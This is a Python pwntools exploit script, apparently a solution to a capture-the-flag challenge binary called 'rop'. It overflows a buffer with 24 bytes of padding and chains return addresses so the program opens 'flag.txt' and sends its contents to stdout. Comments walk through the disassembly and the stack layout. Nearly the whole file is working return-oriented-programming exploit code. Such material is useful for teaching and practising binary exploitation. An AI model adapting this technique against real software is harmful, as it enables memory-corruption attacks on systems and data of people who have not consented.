#!/usr/bin/env python3
from pwn import *



def main():
    offset = 24

    p = process('rop')
    # sym.foo will only open, but will not "sendfile"/output anything from it
    # saved return address to return from foo's open call
    # --- snip ---
    # mov esi, 0x0              ; int oflag
    # lea rdi, str.flag.txt     ; real flag
    # mov eax, 0                ; parameter of 0
    # call sym.imp.open         ; call symbol import open
    # pop rbp
    # ret
    addr1 = p64(0x00401184)

    # this is where foo will return to
    # the reason we called open first should be obvious, we need to open the correct file
    # then pass execution and or overwrite x variable with address of our opened fd so sendfile will
    # print
    # -- snip --
    # mov eax, dword [rbp-0x4]  ; the value of rbp-4 is 0
    # mov ecx, 0x7d0            ; 2000 ; will read/write 2000 bytes from file to stdout
    # mov edx, 0                ; parameter
    # mov esi, eax              ; esi = 0
    # mov edi, 1                ; write to stdout probabkly
    # mov eax, 0                ; another parameter
    # call sym.imp.sendfile     ; call symbol import sendfile
    addr2 = p64(0x004011d1)

    # this is the setup for syscall sendfile, so we want to return to here
    # the reason we need a junk address is due to the fact that the next register we write will
    # be ebp/rbp, this is not important for us, as without the junk address, ebp would equal our address
    # of addr2 that we want to execute, and eip/rip would be overwritten with junk, causing a seg fault
    if incorrect_flag:
        payload = b"A"*offset + p64(0x0040119c)
    else:
        payload = b"A"*offset + addr1 + p64(0xdeadbeef) + addr2

    p.send(payload)
    p.interactive()

try:
    if len(sys.argv) > 1 and sys.argv[1] == "-f":
        incorrect_flag=True
        main()
    elif sys.argv[1] == "-a":
        incorrect_flag = False
        main()
except IndexError:
    print("Usage: python3 %s [-f] [-a]")
    print("-f\tPrint the false flag\n-a\tPrint the real flag")
